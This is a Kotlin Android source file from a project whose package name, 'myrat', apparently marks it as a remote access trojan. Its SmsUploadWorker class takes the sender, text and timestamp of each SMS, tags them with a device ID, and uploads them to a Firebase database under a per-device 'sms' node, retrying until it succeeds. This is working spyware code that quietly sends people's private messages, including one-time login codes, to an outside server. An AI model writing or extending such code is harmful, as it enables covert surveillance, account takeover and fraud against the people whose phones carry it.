package com.myrat.app.worker

import android.content.Context
import androidx.work.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.MainActivity
import com.myrat.app.data.Sms
import com.myrat.app.utils.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.util.concurrent.TimeUnit

class SmsUploadWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    companion object {
        fun scheduleWork(sender: String, message: String, timestamp: Long, context: Context) {
            val deviceId = MainActivity.getDeviceId(context)
            val inputData = Data.Builder()
                .putString("sender", sender)
                .putString("message", message)
                .putLong("timestamp", timestamp)
                .putString("deviceId", deviceId)
                .build()

            val uploadWork = OneTimeWorkRequestBuilder<SmsUploadWorker>()
                .setInputData(inputData)
                .setConstraints(Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build())
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueue(uploadWork)
        }
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            val sender = inputData.getString("sender") ?: "Unknown"
            val message = inputData.getString("message") ?: ""
            val timestamp = inputData.getLong("timestamp", 0L)
            val deviceId = inputData.getString("deviceId") ?: "unknown_device"

            val sms = Sms(sender, message, timestamp)
            val database = Firebase.database
            val smsRef = database.getReference("Device").child(deviceId).child("sms")

            smsRef.push().setValue(sms).await()
            Logger.log("Uploaded SMS from $sender to Firebase under device $deviceId")
            Result.success()
        } catch (e: Exception) {
            Logger.error("Failed to upload SMS: ${e.message}", e)
            if (runAttemptCount < 5) Result.retry() else Result.failure()
        }
    }
}